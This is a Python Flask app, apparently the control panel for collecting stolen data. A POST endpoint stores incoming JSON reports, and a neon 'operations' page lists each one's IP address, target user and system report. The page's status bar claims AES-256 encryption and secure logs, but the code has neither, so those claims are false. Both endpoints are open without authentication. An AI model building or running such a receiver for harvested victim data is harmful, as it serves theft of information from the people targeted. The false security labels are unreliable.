from flask import Flask, render_template_string, request, jsonify
from datetime import datetime

app = Flask(__name__)

# Kenzz Kaneki System - Gelişmiş Veri Deposu
data_store = []

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KENZZ KANEKI | OPERATION CENTER</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Courier+Prime&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-blue: #00f2ff;
            --neon-purple: #bc13fe;
            --bg-dark: #000a12;
        }

        body {
            /* Derin siber uzay efekti */
            background: radial-gradient(circle at center, #011627 0%, #000a12 100%);
            background-attachment: fixed;
            color: var(--neon-purple);
            font-family: 'Courier Prime', monospace;
            margin: 0;
            padding: 20px;
            overflow-x: hidden;
        }

        /* Arka plana ince siber ızgara (Grid) ekliyoruz */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background-image: 
                linear-gradient(to right, rgba(0, 242, 255, 0.03) 1px, transparent 1px),
                linear-gradient(to bottom, rgba(0, 242, 255, 0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            z-index: -1;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            color: var(--neon-blue);
            text-shadow: 0 0 15px var(--neon-blue), 0 0 30px rgba(0, 242, 255, 0.5);
            text-align: center;
            letter-spacing: 8px;
            margin-bottom: 40px;
            text-transform: uppercase;
            border-bottom: 1px solid var(--neon-blue);
            display: inline-block;
            width: 100%;
            padding-bottom: 10px;
        }

        .container {
            width: 95%;
            margin: auto;
            backdrop-filter: blur(5px);
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0 8px;
            background: transparent;
        }

        th {
            font-family: 'Orbitron', sans-serif;
            background: rgba(188, 19, 254, 0.15);
            color: var(--neon-blue);
            padding: 15px;
            text-align: left;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-top: 1px solid var(--neon-blue);
            border-bottom: 1px solid var(--neon-blue);
        }

        tr {
            transition: all 0.3s ease;
            background: rgba(0, 0, 0, 0.4);
        }

        tr:hover {
            background: rgba(0, 242, 255, 0.1);
            transform: scale(1.01);
            box-shadow: 0 0 15px rgba(0, 242, 255, 0.2);
        }

        td {
            padding: 15px;
            border-bottom: 1px solid rgba(188, 19, 254, 0.2);
            font-size: 0.95rem;
            color: #e0e0e0;
        }

        .ip-cell { color: var(--neon-blue); font-weight: bold; }
        .target-cell { color: var(--neon-purple); text-shadow: 0 0 5px var(--neon-purple); }
        .report-cell { color: #fff; font-family: 'Courier Prime', monospace; opacity: 0.9; }
        .time-cell { color: var(--neon-blue); font-style: italic; }

        .status-bar {
            position: fixed;
            bottom: 0; left: 0; width: 100%;
            background: rgba(0, 10, 18, 0.9);
            border-top: 1px solid var(--neon-blue);
            padding: 5px 20px;
            font-size: 0.7rem;
            display: flex;
            justify-content: space-between;
            color: var(--neon-blue);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>KENZZ KANEKI OPERATIONS</h1>
        <table>
            <thead>
                <tr>
                    <th><span style="color:white;">[</span> IP ADRESİ <span style="color:white;">]</span></th>
                    <th><span style="color:white;">[</span> HEDEF <span style="color:white;">]</span></th>
                    <th><span style="color:white;">[</span> SİSTEM RAPORU <span style="color:white;">]</span></th>
                    <th><span style="color:white;">[</span> ZAMAN <span style="color:white;">]</span></th>
                </tr>
            </thead>
            <tbody>
                {% if data %}
                    {% for item in data %}
                        <tr>
                            <td class="ip-cell">> {{ item.get('ip', '127.0.0.1') }}</td>
                            <td class="target-cell">{{ item.get('user', 'UNDEFINED') }}</td>
                            <td class="report-cell">{{ item.get('full_report', 'Veri akışı hatası...') }}</td>
                            <td class="time-cell">{{ datetime.now().strftime('%H:%M:%S') }}</td>
                        </tr>
                    {% endfor %}
                {% else %}
                    <tr>
                        <td colspan="4" style="text-align:center; color:var(--neon-blue); padding: 50px;">
                            [ SCANNING FOR INCOMING DATA... SYSTEM IDLE ]
                        </td>
                    </tr>
                {% endif %}
            </tbody>
        </table>
    </div>

    <div class="status-bar">
        <span>STATUS: ACTIVE</span>
        <span>ENCRYPTION: AES-256</span>
        <span>LOGS: SECURE</span>
    </div>
</body>
</html>
'''

@app.route('/kenzz-kontrol')
def control_panel():
    return render_template_string(HTML_TEMPLATE, data=data_store, datetime=datetime)

@app.route('/api/data', methods=['POST'])
def receive_data():
    content = request.json
    if content:
        data_store.append(content)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
